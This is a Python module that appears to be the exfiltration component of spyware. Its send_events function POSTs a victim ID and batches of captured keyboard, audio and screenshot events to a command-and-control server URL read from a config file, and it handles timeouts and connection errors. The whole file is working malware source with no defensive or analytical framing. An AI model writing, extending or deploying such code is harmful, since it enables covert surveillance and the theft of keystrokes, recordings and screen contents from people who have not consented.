# Libraries for handling HTTP requests and JSON serialization
import requests
import json
from config import SERVER_URL # Import the C2 server URL from the configuration file

def send_events(victim_id, events):
    """
    Sends a batch of collected events to the Command and Control (C2) server via HTTP POST.

    Args:
        victim_id (str): Unique identifier for the victim machine.
        events (list): List of event dictionaries (keyboard, audio, screenshot).

    Returns:
        bool: True if the data was successfully sent (HTTP 200), False otherwise.
    """
    
    # Structure the data payload to be sent to the server
    payload = {
        "victim_id": victim_id, # Identifies the source of the logs
        "events": events        # The list of events to exfiltrate
    }

    try:
        # Attempt to send the payload as a JSON body to the configured server URL
        # Set a short timeout to prevent the thread from blocking indefinitely
        r = requests.post(SERVER_URL, json=payload, timeout=3)
        
        # Check if the server responded with HTTP status code 200 (OK)
        return r.status_code == 200
    except requests.exceptions.Timeout:
        # Handle connection timeout errors (server too slow or busy)
        print("[Sender] ERROR: Request timed out.")
        return False
    except requests.exceptions.RequestException as e:
        # Handle other connection errors (DNS failure, connection refusal, etc.)
        print(f"[Sender] ERROR: Connection failed: {e}")
        return False
    except Exception:
        # Catch any other unexpected error during the sending process
        return False